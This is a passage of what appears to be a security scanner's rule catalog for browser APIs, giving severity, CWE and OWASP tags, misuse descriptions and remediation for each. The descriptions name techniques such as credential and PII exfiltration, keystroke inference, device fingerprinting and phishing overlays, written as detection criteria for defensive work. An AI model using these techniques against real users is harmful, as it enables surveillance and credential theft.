    "speech_synthesis_security": {
        "severity": "HIGH",
        "cwe": "CWE-79",
        "owasp": "A03:2021 - Injection",
        "description": "Speech Synthesis API misuse — voice list enumerated and transmitted for browser fingerprinting, utterance text from URL parameter enables attacker-controlled audio phishing, social engineering text spoken to deceive users.",
        "remediation": [
            "Do not transmit speechSynthesis.getVoices() results to analytics endpoints",
            "Never source SpeechSynthesisUtterance text from URL parameters without strict sanitization",
            "Avoid TTS content that could be used for social engineering (password prompts, verify/authorize text)",
            "Audit all TTS content for potential phishing or deceptive audio messaging",
        ],
        "references": ["https://w3c.github.io/speech-api/#tts-section", "https://cwe.mitre.org/data/definitions/79.html"],
    },
    "media_recorder_security": {
        "severity": "CRITICAL",
        "cwe": "CWE-359",
        "owasp": "A01:2021 - Broken Access Control",
        "description": "MediaRecorder API misuse — recording auto-started on page load without explicit user action, recorded audio/video Blob transmitted to remote server, continuous chunked upload via timeslice enables real-time media streaming surveillance.",
        "remediation": [
            "Only start MediaRecorder in response to explicit user gestures — never on DOMContentLoaded/pageshow",
            "Do not transmit recorded Blob data to remote servers without explicit user consent",
            "Avoid timeslice-based continuous chunked uploads to external endpoints",
            "Implement clear visual recording indicators whenever MediaRecorder is active",
        ],
        "references": ["https://www.w3.org/TR/mediastream-recording/", "https://cwe.mitre.org/data/definitions/359.html"],
    },
    "gamepad_security": {
        "severity": "HIGH",
        "cwe": "CWE-359",
        "owasp": "A01:2021 - Broken Access Control",
        "description": "Gamepad API misuse — getGamepads() input state transmitted to remote (controller surveillance), continuous button/axes polling via rAF, GamepadEvent id/mapping exfiltrated for fingerprinting, gamepad state correlated with keyboard/password inputs.",
        "remediation": [
            "Do not transmit getGamepads() output to remote analytics or tracking endpoints",
            "Avoid continuous rAF polling of gamepad state that ships data to external servers",
            "Do not use GamepadEvent device identifiers for browser fingerprinting",
            "Audit any code correlating gamepad input with credential/password fields",
        ],
        "references": ["https://w3c.github.io/gamepad/", "https://cwe.mitre.org/data/definitions/359.html"],
    },
    "proximity_sensor_security": {
        "severity": "HIGH",
        "cwe": "CWE-359",
        "owasp": "A01:2021 - Broken Access Control",
        "description": "Proximity Sensor API misuse — ProximitySensor near/distance readings exfiltrated to remote, sensor data correlated with auth/payment/login events (physical activity inference), continuous proximity polling with data upload.",
        "remediation": [
            "Do not transmit ProximitySensor readings to remote endpoints or analytics",
            "Never correlate proximity sensor state with authentication or payment events",
            "Avoid continuous sensor polling that uploads data to external servers",
            "Require explicit user consent before activating proximity sensor features",
        ],
        "references": ["https://w3c.github.io/proximity/", "https://cwe.mitre.org/data/definitions/359.html"],
    },
    "picture_in_picture_security": {
        "severity": "MEDIUM",
        "cwe": "CWE-358",
        "owasp": "A05:2021 - Security Misconfiguration",
        "description": "Picture-in-Picture API misuse — requestPictureInPicture() triggered on page load without user gesture, PiP enter/leave events transmitted for media behaviour surveillance, PiP window dimensions used for screen fingerprinting, URL parameter controls PiP target.",
        "remediation": [
            "Only call requestPictureInPicture() from explicit user gesture event handlers",
            "Do not transmit PiP state change events to remote analytics",
            "Avoid using PictureInPictureWindow width/height for fingerprinting",
            "Never drive PiP target from URL parameters or user-controlled input",
        ],
        "references": ["https://w3c.github.io/picture-in-picture/", "https://cwe.mitre.org/data/definitions/358.html"],
    },
    "keyboard_lock_security": {
        "severity": "HIGH",
        "cwe": "CWE-285",
        "owasp": "A01:2021 - Broken Access Control",
        "description": "Keyboard Lock API misuse — keyboard.lock([]) captures all system keys (Escape/Meta/F-keys) blocking user ability to exit page, KeyboardLayoutMap data transmitted for keyboard locale fingerprinting, keyboard.lock() auto-triggered on fullscreen/load.",
        "remediation": [
            "Never use keyboard.lock([]) — specify only the minimum keys required for the experience",
            "Do not lock system exit keys (Escape, Meta, F11) that users depend on to leave fullscreen",
            "Do not transmit getLayoutMap() keyboard locale data to remote analytics",
            "Only activate keyboard.lock() in response to explicit user fullscreen requests",
        ],
        "references": ["https://wicg.github.io/keyboard-lock/", "https://cwe.mitre.org/data/definitions/285.html"],
    },
    "resource_timing_security": {
        "severity": "HIGH",
        "cwe": "CWE-208",
        "owasp": "A07:2021 - Identification and Authentication Failures",
        "description": "Resource Timing API misuse — PerformanceResourceTiming duration/transferSize exfiltrated to remote (network timing side-channel), timing correlated with auth/login endpoints (timing oracle for credential probing), full resource list enumerated and transmitted (page request inventory disclosure).",
        "remediation": [
            "Do not transmit PerformanceResourceTiming data to remote analytics or tracking endpoints",
            "Avoid correlating resource timing with authentication/login endpoint responses",
            "Do not enumerate and transmit performance.getEntries() to external servers",
            "Deploy Timing-Allow-Origin headers carefully and limit cross-origin timing exposure",
        ],
        "references": ["https://w3c.github.io/resource-timing/", "https://cwe.mitre.org/data/definitions/208.html"],
    },
    "permission_policy_security": {
        "severity": "HIGH",
        "cwe": "CWE-732",
        "owasp": "A05:2021 - Security Misconfiguration",
        "description": "Permissions Policy misconfiguration — wildcard (*) grants to camera/microphone/geolocation/payment, iframes granted sensitive permissions via over-permissive allow= attribute, serial/USB/Bluetooth features granted wildcard access.",
        "remediation": [
            "Use specific origins in Permissions-Policy instead of wildcards (*)",
            "Restrict iframe allow= to only permissions required by the embedded content",
            "Explicitly block high-risk features (serial, usb, bluetooth) via Permissions-Policy",
            "Audit all Permissions-Policy headers on responses to minimize permission grants",
        ],
        "references": ["https://w3c.github.io/webappsec-permissions-policy/", "https://cwe.mitre.org/data/definitions/732.html"],
    },
    "long_animation_frame_security": {
        "severity": "MEDIUM",
        "cwe": "CWE-208",
        "owasp": "A07:2021 - Identification and Authentication Failures",
        "description": "Long Animation Frame (LoAF) API misuse — LoAF timing data exfiltrated to remote (performance side-channel), timing correlated with keydown/input events (keystroke timing inference via animation jitter), script attribution URLs transmitted (internal code structure disclosure).",
        "remediation": [
            "Do not transmit LoAF timing entries to remote analytics endpoints",
            "Avoid correlating long animation frame timing with user input or authentication events",
            "Do not transmit LoAF script attribution (sourceURL/invokerType) to external servers",
            "Use buffered: false for PerformanceObserver to limit historical data collection",
        ],
        "references": ["https://w3c.github.io/long-animation-frames/", "https://cwe.mitre.org/data/definitions/208.html"],
    },
    "scroll_timeline_security": {
        "severity": "MEDIUM",
        "cwe": "CWE-359",
        "owasp": "A01:2021 - Broken Access Control",
        "description": "Scroll Timeline API misuse — ScrollTimeline currentTime/progress transmitted to remote (user scroll position surveillance), scroll state correlated with auth/login context, ViewTimeline offset data exfiltrated, scroll timeline target configured from URL parameter.",
        "remediation": [
            "Do not transmit ScrollTimeline currentTime or progress values to remote analytics",
            "Avoid correlating scroll position state with authentication or session events",
            "Never configure ScrollTimeline/ViewTimeline targets from URL parameters",
            "Audit ViewTimeline usage for element visibility data being transmitted to third parties",
        ],
        "references": ["https://drafts.csswg.org/scroll-animations-1/", "https://cwe.mitre.org/data/definitions/359.html"],
    },
    "anchor_positioning_security": {
        "severity": "HIGH",
        "cwe": "CWE-79",
        "owasp": "A03:2021 - Injection",
        "description": "CSS Anchor Positioning misuse — anchor-name/position-anchor set from URL parameter (layout injection), anchor() positions overlay near password/payment fields (phishing overlay attack), CSS positioning injected via setAttribute/style.cssText, anchor-name sourced from cookies/localStorage.",
        "remediation": [
            "Never set CSS anchor-name or position-anchor properties from URL parameters or user input",
            "Audit anchor() usages that position elements near sensitive UI elements (login/payment fields)",
            "Do not inject anchor-name or position-anchor via setAttribute with user-controlled values",
            "Implement CSP style-src to restrict CSS injection vectors",
        ],
        "references": ["https://drafts.csswg.org/css-anchor-position-1/", "https://cwe.mitre.org/data/definitions/79.html"],
    },
    "css_cascade_layers_security": {
        "severity": "HIGH",
        "cwe": "CWE-79",
        "owasp": "A03:2021 - Injection",
        "description": "CSS Cascade Layers misuse — @layer name/content sourced from URL parameter (cascade injection), @layer injected via insertRule/innerHTML, !important in @layer near auth/token elements (cascade priority bypass), layer order controlled from URL parameter.",
        "remediation": [
            "Never construct @layer rule names from URL parameters or user-controlled input",
            "Do not inject @layer rules via insertRule or innerHTML with user-provided values",
            "Audit @layer usage that uses !important near authentication or token-related UI elements",
            "Implement CSP style-src to prevent dynamic CSS injection attacks",
        ],
        "references": ["https://www.w3.org/TR/css-cascade-5/", "https://cwe.mitre.org/data/definitions/79.html"],
    },
    "css_houdini_security": {
        "severity": "CRITICAL",
        "cwe": "CWE-94",
        "owasp": "A03:2021 - Injection",
        "description": "CSS Houdini API misuse — paintWorklet module URL from URL parameter (arbitrary worklet code execution), worklet loaded from external domain (third-party CSS code execution), CSS.registerProperty from URL param (property injection), registerPaint worklet contains fetch (data exfiltration from paint context).",
        "remediation": [
            "Never source CSS worklet module URLs from URL parameters or user input",
            "Restrict CSS worklet loading to same-origin or trusted domains only",
            "Do not pass URL parameter values to CSS.registerProperty() calls",
            "Audit registerPaint/registerLayout worklets for fetch/network calls that could exfiltrate data",
        ],
        "references": ["https://drafts.css-houdini.org/css-paint-api/", "https://cwe.mitre.org/data/definitions/94.html"],
    },
    "css_custom_properties_security": {
        "severity": "HIGH",
        "cwe": "CWE-79",
        "owasp": "A03:2021 - Injection",
        "description": "CSS Custom Properties misuse — CSS variable value set from URL parameter (variable injection), var() inside url() pointing to external domain (CSS-based exfiltration request), getPropertyValue() reads security-sensitive variable and transmits to remote, CSS variable injected via style attribute.",
        "remediation": [
            "Never set CSS custom property values from URL parameters or user-controlled input",
            "Do not use CSS var() inside url() that points to user-controlled or external domains",
            "Audit getPropertyValue() calls on security-sensitive CSS variables for data leakage",
            "Sanitize all user input before it is applied to element style attributes or CSS text",
        ],
        "references": ["https://www.w3.org/TR/css-variables-1/", "https://cwe.mitre.org/data/definitions/79.html"],
    },
    "coop_security": {
        "severity": "HIGH",
        "cwe": "CWE-346",
        "owasp": "A05:2021 - Security Misconfiguration",
        "description": "Cross-Origin Opener Policy (COOP) misuse — window.opener data accessed and transmitted to remote (cross-origin opener exfiltration), opener DOM/storage/navigation manipulation without COOP isolation, cross-origin popup controlled via retained opener reference, COOP set to weak same-origin-allow-popups.",
        "remediation": [
            "Set Cross-Origin-Opener-Policy: same-origin to break the opener relationship with cross-origin windows",
            "Do not transmit data obtained from window.opener to remote endpoints",
            "Avoid window.opener.localStorage or window.opener.document access without COOP protection",
            "Prefer same-origin over same-origin-allow-popups unless popup communication is strictly required",
        ],
        "references": ["https://html.spec.whatwg.org/multipage/cross-origin-opener-policy.html", "https://cwe.mitre.org/data/definitions/346.html"],
    },
    "coep_security": {
        "severity": "HIGH",
        "cwe": "CWE-208",
        "owasp": "A05:2021 - Security Misconfiguration",
        "description": "Cross-Origin Embedder Policy (COEP) misuse — SharedArrayBuffer transferred without COEP+COOP cross-origin isolation (Spectre risk), Atomics.wait/notify combined with network requests (high-resolution timing oracle), crossOriginIsolated=false with SAB/Atomics usage.",
        "remediation": [
            "Deploy both COEP: require-corp and COOP: same-origin before using SharedArrayBuffer or Atomics",
            "Do not use Atomics.wait/notify in combination with network requests that could leak timing information",
            "Check crossOriginIsolated before using SharedArrayBuffer and gracefully degrade if not isolated",
            "Use COEP: credentialless as an alternative when cannot control all embedded resources",
        ],
        "references": ["https://wicg.github.io/cross-origin-embedder-policy/", "https://cwe.mitre.org/data/definitions/208.html"],
    },
    "corp_security": {
        "severity": "HIGH",
        "cwe": "CWE-346",
        "owasp": "A05:2021 - Security Misconfiguration",
        "description": "Cross-Origin Resource Policy (CORP) misconfiguration — CORP header set to cross-origin (allows any origin to embed resource, enabling Spectre attacks), no-cors mode on auth/token endpoints (opaque response bypass), SharedArrayBuffer/Atomics in cross-origin context (Spectre timing gadget).",
        "remediation": [
            "Set Cross-Origin-Resource-Policy: same-origin or same-site for sensitive resources",
            "Avoid CORP: cross-origin on resources that contain user data or authentication tokens",
            "Do not use mode: 'no-cors' for requests to auth/token/session endpoints",
            "Combine CORP with COEP and COOP for complete cross-origin isolation",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cross-Origin-Resource-Policy", "https://cwe.mitre.org/data/definitions/346.html"],
    },
    "trust_token_security": {
        "severity": "HIGH",
        "cwe": "CWE-359",
        "owasp": "A01:2021 - Broken Access Control",
        "description": "Private State Token (formerly Trust Token) misuse — token redemption result transmitted to remote (token-based cross-site tracking), token issuer configured from URL parameter (issuer manipulation), hasPrivateToken/hasTrustToken presence transmitted to analytics (binary cross-site tracking signal), forced redemption on page load.",
        "remediation": [
            "Do not transmit Private State Token redemption records to remote analytics or third-party servers",
            "Never configure token issuers from URL parameters or user-controlled input",
            "Audit hasPrivateToken()/hasTrustToken() usage to prevent presence-based cross-site tracking",
            "Only trigger token redemption in response to explicit user actions requiring trust verification",
        ],
        "references": ["https://wicg.github.io/trust-token-api/", "https://cwe.mitre.org/data/definitions/359.html"],
    },
    "css_container_query_security": {
        "severity": "HIGH",
        "cwe": "CWE-79",
        "owasp": "A03:2021 - Injection",
        "description": "CSS Container Query misuse — container-name/@container rule sourced from URL parameter (cascade injection), @container injected via insertRule/innerHTML, @container applies external url() (CSS exfiltration via request), container size breakpoint triggers analytics (viewport fingerprinting).",
        "remediation": [
            "Never source CSS container names or @container rule content from URL parameters",
            "Do not inject @container rules via insertRule or innerHTML with user-controlled values",
            "Audit @container rules for url() functions pointing to external domains",
            "Implement CSP style-src to prevent dynamic CSS injection attacks",
        ],
        "references": ["https://www.w3.org/TR/css-contain-3/", "https://cwe.mitre.org/data/definitions/79.html"],
    },
    "import_assertions_security": {
        "severity": "CRITICAL",
        "cwe": "CWE-94",
        "owasp": "A03:2021 - Injection",
        "description": "Import Assertions / Module Attributes misuse — dynamic import() URL from URL parameter with type assertion (attacker-controlled module execution), import map injected via innerHTML (module specifier hijacking), JSON module imported from path with sensitive keywords, import map maps to external URL (supply chain risk).",
        "remediation": [
            "Never construct dynamic import() URLs from URL parameters or user-controlled input",
            "Do not inject import maps via innerHTML or document.write with untrusted content",
            "Audit import assertions for paths that may expose sensitive data as JSON modules",
            "Restrict import map specifiers to same-origin or trusted CDN sources only",
        ],
        "references": ["https://tc39.es/proposal-import-attributes/", "https://cwe.mitre.org/data/definitions/94.html"],
    },
    "fetch_priority_security": {
        "severity": "MEDIUM",
        "cwe": "CWE-208",
        "owasp": "A07:2021 - Identification and Authentication Failures",
        "description": "Fetch Priority API misuse — fetchpriority/importance attribute set from URL parameter (priority injection), fetch priority combined with performance timing (timing side-channel oracle), priority correlated with auth/session state (covert channel for user state inference).",
        "remediation": [
            "Do not set fetchpriority or importance attributes from URL parameters or user input",
            "Avoid combining fetch priority manipulation with high-resolution performance timing measurements",
            "Do not use fetch priority as a covert channel to encode user authentication state",
            "Audit resource hints and fetch priority assignments for potential timing side-channel exposure",
        ],
        "references": ["https://wicg.github.io/priority-hints/", "https://cwe.mitre.org/data/definitions/208.html"],
    },
    "prerendering_security": {
        "severity": "HIGH",
        "cwe": "CWE-200",
        "owasp": "A01:2021 - Broken Access Control",
        "description": "Prerendering misuse — network/storage operations triggered while document.prerendering=true (premature data exposure in prerender phase), prerender/speculation rules URL from URL parameter (attacker-controlled prerender target), prerenderingchange event transmits data to remote, ActivationStart timing fingerprinting.",
        "remediation": [
            "Defer all network requests, analytics, and storage writes until prerenderingchange fires (prerendering=false)",
            "Never source prerender target URLs from URL parameters or user-controlled input",
            "Do not transmit prerenderingchange event timing data to remote analytics",
            "Audit speculation rules JSON for externally-controlled URL sources",
        ],
        "references": ["https://wicg.github.io/nav-speculation/prerendering.html", "https://cwe.mitre.org/data/definitions/200.html"],
    },
    "storage_access_api_security": {
        "severity": "HIGH",
        "cwe": "CWE-359",
        "owasp": "A01:2021 - Broken Access Control",
        "description": "Storage Access API misuse — requestStorageAccess() used to read cross-site cookies/localStorage and exfiltrate to remote, automatic storage access requests without user gesture, hasStorageAccess() result transmitted as cross-site tracking signal, requestStorageAccessFor() target from URL parameter.",
        "remediation": [
            "Only request storage access in response to explicit user gesture events (click, etc.)",
            "Do not read cross-site storage immediately after requestStorageAccess() for exfiltration purposes",
            "Do not transmit hasStorageAccess() results to remote analytics as a cross-site tracking signal",
            "Never pass URL parameters as the origin argument to requestStorageAccessFor()",
        ],
        "references": ["https://privacycg.github.io/storage-access/", "https://cwe.mitre.org/data/definitions/359.html"],
    },
    "document_domain_security": {
        "severity": "HIGH",
        "cwe": "CWE-346",
        "owasp": "A05:2021 - Security Misconfiguration",
        "description": "document.domain manipulation — domain set from URL parameter (attacker-controlled same-origin relaxation), document.domain relaxation weakens cross-subdomain isolation, domain changed followed by data exfiltration, Origin-Agent-Cluster disabled allowing document.domain mutation.",
        "remediation": [
            "Avoid setting document.domain — use postMessage for cross-subdomain communication instead",
            "Never set document.domain from URL parameters or user-controlled input",
            "Enable Origin-Agent-Cluster by serving the Origin-Agent-Cluster: ?1 header",
            "Audit all usages of document.domain for potential subdomain isolation weakening",
        ],
        "references": ["https://html.spec.whatwg.org/multipage/origin.html#relaxing-the-same-origin-restriction", "https://cwe.mitre.org/data/definitions/346.html"],
    },
    "identity_credential_security": {
        "severity": "CRITICAL",
        "cwe": "CWE-359",
        "owasp": "A02:2021 - Cryptographic Failures",
        "description": "Digital Identity Credential API misuse — IdentityCredential token/claims transmitted to unauthorized remote endpoint, digital credential provider URL from URL parameter (attacker-controlled identity provider), silent credential presentation without user awareness, PII fields (name/email/DOB/national_id) exfiltrated.",
        "remediation": [
            "Do not transmit IdentityCredential tokens or claims to unauthorized endpoints or analytics",
            "Never configure digital credential provider URLs from URL parameters or user input",
            "Avoid mediation:silent for digital credential requests — require explicit user interaction",
            "Audit all IdentityCredential field access to prevent PII exfiltration",
        ],
        "references": ["https://wicg.github.io/digital-credentials/", "https://cwe.mitre.org/data/definitions/359.html"],
    },
    "css_scope_security": {
        "severity": "HIGH",
        "cwe": "CWE-79",
        "owasp": "A03:2021 - Injection",
        "description": "CSS @scope misuse — @scope selector sourced from URL parameter (attacker-controlled scope injection), @scope rule injected via insertRule/innerHTML (dynamic CSS scope manipulation), adoptedStyleSheets state transmitted to remote, CSSStyleSheet.replace() content from URL parameter (constructable stylesheet injection).",
        "remediation": [
            "Never source @scope rule selectors from URL parameters or user-controlled input",
            "Do not inject @scope rules via insertRule or innerHTML with user-provided content",
            "Audit adoptedStyleSheets usage for unintended data transmission",
            "Never pass URL parameter values as content to CSSStyleSheet.replace() or replaceSync()",
        ],
        "references": ["https://www.w3.org/TR/css-cascade-6/#scope-atrule", "https://cwe.mitre.org/data/definitions/79.html"],
    },
    "css_nesting_security": {
        "severity": "HIGH",
        "cwe": "CWE-79",
        "owasp": "A03:2021 - Injection",
        "description": "CSS Nesting misuse — @nest/& selector sourced from URL parameter (nested CSS injection), nested rule injected via insertRule/innerHTML, nested CSS rule uses url() on external domain (CSS exfiltration via nested selector), CSSNestingRule selector from URL parameter.",
        "remediation": [
            "Never source CSS nesting selectors (@nest/&) from URL parameters or user-controlled input",
            "Do not inject nested CSS rules via insertRule or innerHTML with user-provided content",
            "Audit nested CSS rules for url() functions pointing to external domains",
            "Implement CSP style-src to prevent dynamic nested CSS injection attacks",
        ],
        "references": ["https://www.w3.org/TR/css-nesting-1/", "https://cwe.mitre.org/data/definitions/79.html"],
    },
    "css_font_palette_security": {
        "severity": "MEDIUM",
        "cwe": "CWE-359",
        "owasp": "A05:2021 - Security Misconfiguration",
        "description": "CSS Font Palette / FontFace API misuse — FontFace constructed from URL parameter (attacker-controlled font injection), FontFace loaded from external domain (third-party font tracking via request), document.fonts properties enumerated and transmitted (font-based fingerprinting), @font-palette-values injected via insertRule.",
        "remediation": [
            "Never construct FontFace objects from URL parameters or user-controlled input",
            "Restrict external font loading with font-src CSP directives",
            "Do not transmit document.fonts enumeration results to remote analytics endpoints",
            "Audit @font-palette-values injection via insertRule for user-controlled values",
        ],
        "references": ["https://www.w3.org/TR/css-fonts-4/", "https://cwe.mitre.org/data/definitions/359.html"],
    },
    "object_url_security": {
        "severity": "HIGH",
        "cwe": "CWE-94",
        "owasp": "A03:2021 - Injection",
        "description": "Object URL / Blob URL misuse — URL.createObjectURL() creates blob from credentials/tokens (sensitive data encoded in blob), blob content from URL parameter (attacker-controlled blob injection), createObjectURL() used to inject Worker code (dynamic code execution via blob: Worker).",
        "remediation": [
            "Never include credentials, tokens, or sensitive data in blob content passed to URL.createObjectURL()",
            "Do not construct Blob content from URL parameters or user-controlled input",
            "Avoid using URL.createObjectURL() to create Worker script URLs from untrusted content",
            "Always call URL.revokeObjectURL() after use to prevent memory leaks and URL retention",
        ],
        "references": ["https://www.w3.org/TR/FileAPI/#url", "https://cwe.mitre.org/data/definitions/94.html"],
    },
    "worker_module_security": {
        "severity": "CRITICAL",
        "cwe": "CWE-94",
        "owasp": "A03:2021 - Injection",
        "description": "Worker Module misuse — Worker/SharedWorker URL from URL parameter (attacker-controlled worker code execution), worker loaded from external domain (third-party code in worker context), importScripts() URL from URL parameter (script injection into worker), worker.postMessage() sends credentials to worker.",
        "remediation": [
            "Never construct Worker or SharedWorker URLs from URL parameters or user-controlled input",
            "Restrict worker script loading to same-origin resources only via CSP worker-src",
            "Do not pass URL parameter values to importScripts() inside workers",
            "Avoid transmitting credentials, tokens, or passwords via worker.postMessage()",
        ],
        "references": ["https://html.spec.whatwg.org/multipage/workers.html", "https://cwe.mitre.org/data/definitions/94.html"],
    },
    "abort_controller_security": {
        "severity": "MEDIUM",
        "short": "AbortController / AbortSignal Security",
        "cwe": "CWE-362", "owasp": "A01:2021",
        "threats": [
            "AbortController configured from URL parameter: attacker controls which requests are cancelled, denying service selectively",
            "AbortSignal.timeout() + performance.now() timing oracle: network abort timing used to infer server-side processing state",
            "AbortSignal on auth/session fetch: authentication request race-cancelled before completing, partial token issuance",
            "controller.abort() called while fetch in-flight: race condition in request cancellation leaves state inconsistent",
        ],
        "mitigations": [
            "Never derive AbortController parameters from user-supplied URL query values",
            "Avoid exposing AbortSignal timeout timing differences to attacker-observable channels",
            "Ensure auth/session requests complete before any attacker-controlled abort can fire",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/API/AbortController", "https://cwe.mitre.org/data/definitions/362.html"],
    },
    "observable_api_security": {
        "severity": "HIGH",
        "short": "Observable API Stream Security",
        "cwe": "CWE-359", "owasp": "A01:2021",
        "threats": [
            "Observable streaming credentials/tokens to remote endpoint: continuous exfiltration of auth material via reactive stream",
            "Observable source configured from URL parameter: attacker-controlled data injected into reactive stream processing",
            "ObservableEventTarget events transmitted to remote: DOM event surveillance via Observable-based covert channel",
            "Unbounded keydown/scroll/input Observable with sendBeacon: keystroke and interaction logger via reactive event stream",
        ],
        "mitigations": [
            "Never subscribe to Observable streams that emit auth tokens or credentials to remote endpoints",
            "Validate and sanitize Observable source configuration — do not derive from URL parameters",
            "Scope event Observable subscriptions to required events only; unsubscribe when done",
        ],
        "references": ["https://wicg.github.io/observable/", "https://cwe.mitre.org/data/definitions/359.html"],
    },
    "css_masonry_security": {
        "severity": "MEDIUM",
        "short": "CSS Masonry Layout Injection",
        "cwe": "CWE-94", "owasp": "A03:2021",
        "threats": [
            "CSS masonry grid property sourced from URL parameter: attacker injects arbitrary layout rules via query string",
            "Masonry layout injected via insertRule/innerHTML/setAttribute: dynamic layout manipulation by attacker-controlled content",
            "masonryAutoFlow state transmitted to remote: masonry layout behaviour used as covert fingerprinting channel",
        ],
        "mitigations": [
            "Never construct CSS grid-template-rows/columns values from URL parameters or untrusted input",
            "Sanitize dynamic CSS insertRule calls — reject values containing 'masonry'",
            "Do not transmit CSS layout state (masonryAutoFlow) to remote analytics endpoints",
        ],
        "references": ["https://drafts.csswg.org/css-grid-3/", "https://cwe.mitre.org/data/definitions/94.html"],
    },
    "css_math_security": {
        "severity": "MEDIUM",
        "short": "CSS Math Function Injection",
        "cwe": "CWE-94", "owasp": "A03:2021",
        "threats": [
            "calc()/min()/max()/clamp() values derived from URL parameters: attacker injects arithmetic layout expressions",
            "env(safe-area-inset-*) queried and transmitted to remote: device safe-area geometry used for device fingerprinting",
            "CSS math expression injected via setAttribute: attacker-controlled arithmetic overrides layout constraints",
        ],
        "mitigations": [
            "Validate and allowlist CSS calc() / clamp() values before applying user-supplied numeric inputs",
            "Do not transmit env() safe-area values to third-party analytics endpoints",
            "Sanitize all dynamic style.width/height assignments that include calc() expressions",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/CSS/calc", "https://cwe.mitre.org/data/definitions/94.html"],
    },
    "video_decoder_security": {
        "severity": "HIGH",
        "short": "VideoDecoder / VideoEncoder API Security",
        "cwe": "CWE-200", "owasp": "A01:2021",
        "threats": [
            "VideoDecoder timing transmitted remotely: codec decode latency used as hardware timing oracle for device fingerprinting",
            "VideoFrame pixel data exfiltrated: decoded video frame content sent to remote endpoint via fetch/sendBeacon",
            "Codec configured from URL parameter: attacker-controlled codec string passed to VideoDecoder.configure()",
            "EncodedVideoChunk loaded cross-origin without CORP: untrusted media data decoded without Cross-Origin-Resource-Policy",
        ],
        "mitigations": [
            "Never transmit VideoDecoder timing measurements to remote analytics",
            "Restrict VideoFrame data access to same-origin canvas operations only",
            "Validate codec strings against an allowlist before passing to VideoDecoder.configure()",
        ],
        "references": ["https://www.w3.org/TR/webcodecs/", "https://cwe.mitre.org/data/definitions/200.html"],
    },
    "audio_worklet_security": {
        "severity": "HIGH",
        "short": "AudioWorklet / AudioContext Security",
        "cwe": "CWE-359", "owasp": "A01:2021",
        "threats": [
            "AudioContext characteristics transmitted for fingerprinting: sampleRate/baseLatency/channelCount used as device identifier",
            "AudioWorkletNode connected to microphone with network exfil: audio surveillance via Web Audio API pipeline",
            "audioWorklet.addModule() URL from URL parameter: attacker-controlled worklet code loading (arbitrary code execution)",
            "AudioContext timing covert channel: currentTime/outputLatency precision used to leak cross-origin timing information",
        ],
        "mitigations": [
            "Do not transmit AudioContext characteristics to remote analytics endpoints",
            "Validate audioWorklet.addModule() URLs against an allowlist — never source from URL parameters",
            "Restrict AudioWorkletNode microphone connections to explicitly user-consented contexts",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/API/AudioWorklet", "https://cwe.mitre.org/data/definitions/359.html"],
    },
    "media_capabilities_security": {
        "severity": "MEDIUM",
        "short": "MediaCapabilities API Fingerprinting",
        "cwe": "CWE-359", "owasp": "A01:2021",
        "threats": [
            "decodingInfo/encodingInfo results transmitted for fingerprinting: codec support matrix identifies device hardware",
            "Batch codec probes sent to remote: systematic enumeration of all supported codecs for comprehensive device profile",
            "Media capabilities query from URL parameter: attacker-controlled codec probe parameters",
            "smooth/powerEfficient/supported flags transmitted: hardware decoder state used as persistent cross-site identifier",
        ],
        "mitigations": [
            "Do not transmit MediaCapabilities results to remote endpoints — treat codec support as sensitive fingerprinting data",
            "Rate-limit decodingInfo() calls to prevent systematic hardware enumeration",
        ],
        "references": ["https://www.w3.org/TR/media-capabilities/", "https://cwe.mitre.org/data/definitions/359.html"],
    },
    "web_hid_security": {
        "severity": "HIGH",
        "short": "WebHID API Security",
        "cwe": "CWE-359", "owasp": "A01:2021",
        "threats": [
            "hid.getDevices() auto-connect on page load: silent re-connection to previously granted HID devices without user gesture",
            "HID input report data exfiltrated: raw hardware device input stream transmitted to attacker-controlled endpoint",
            "requestDevice() filter from URL parameter: attacker-controlled vendorId/productId targeting specific HID devices",
            "HID input report keystroke inference: keyboard HID reports decoded to reconstruct user keystrokes",
        ],
        "mitigations": [
            "Never call hid.getDevices() or automatically open devices without an explicit user gesture",
            "Do not transmit raw HID input reports to remote endpoints",
            "Validate HID device filter parameters — never source from URL query values",
        ],
        "references": ["https://wicg.github.io/webhid/", "https://cwe.mitre.org/data/definitions/359.html"],
    },
    "virtual_keyboard_security": {
        "severity": "MEDIUM",
        "short": "VirtualKeyboard API Security",
        "cwe": "CWE-200", "owasp": "A01:2021",
        "threats": [
            "Keyboard bounding rect transmitted for fingerprinting: on-screen keyboard dimensions reveal device type and platform",
            "overlaysContent=true near auth/login form: keyboard overlay used to obscure or phish credential input fields",
            "VirtualKeyboard API controlled from URL parameter: attacker-controlled keyboard visibility manipulation",
            "Keyboard inset dimensions used for device profiling: safe-area-like geometry fingerprints mobile device models",
        ],
        "mitigations": [
            "Do not transmit VirtualKeyboard.boundingRect dimensions to remote analytics",
            "Avoid using overlaysContent=true on pages with auth/login forms",
            "Never source VirtualKeyboard configuration from URL parameters",
        ],
        "references": ["https://www.w3.org/TR/virtual-keyboard/", "https://cwe.mitre.org/data/definitions/200.html"],
    },
    "rtc_encoded_transform_security": {
        "severity": "HIGH",
        "short": "RTCInsertableStreams / Encoded Transform Security",
        "cwe": "CWE-311", "owasp": "A02:2021",
        "threats": [
            "RTCEncodedVideoFrame/AudioFrame exfiltrated to remote: WebRTC media stream intercepted via insertable streams API",
            "SFrameTransform encryption key from URL parameter: attacker-controlled key material used to encrypt WebRTC media",
            "Math.random/xor used instead of SubtleCrypto: weak DIY encryption applied to video/audio frames",
            "readable.pipeTo(writable) passthrough without transform: insertable streams used as tap without any encryption",
        ],
        "mitigations": [
            "Use SubtleCrypto for all WebRTC frame encryption — never use Math.random() or simple XOR as key material",
            "Never derive SFrameTransform keys from URL parameters or user-controlled input",
            "Audit all createEncodedStreams() usages to ensure transforms apply proper cryptographic protection",
        ],
        "references": ["https://www.w3.org/TR/webrtc-encoded-transform/", "https://cwe.mitre.org/data/definitions/311.html"],
    },
    "page_lifecycle_security": {
        "severity": "MEDIUM",
        "short": "Page Lifecycle API Security",
        "cwe": "CWE-359", "owasp": "A01:2021",
        "threats": [
            "Data exfiltrated on freeze event: sendBeacon/fetch in freeze handler drains session state on tab background/close",
            "visibilitychange events transmitted to analytics: tab focus/blur patterns used for user attention surveillance",
            "wasDiscarded flag transmitted to remote: page discard state fingerprints session recovery behaviour",
            "Keydown captured while document.hidden: keyboard input surveillance continues when page is backgrounded",
        ],
        "mitigations": [
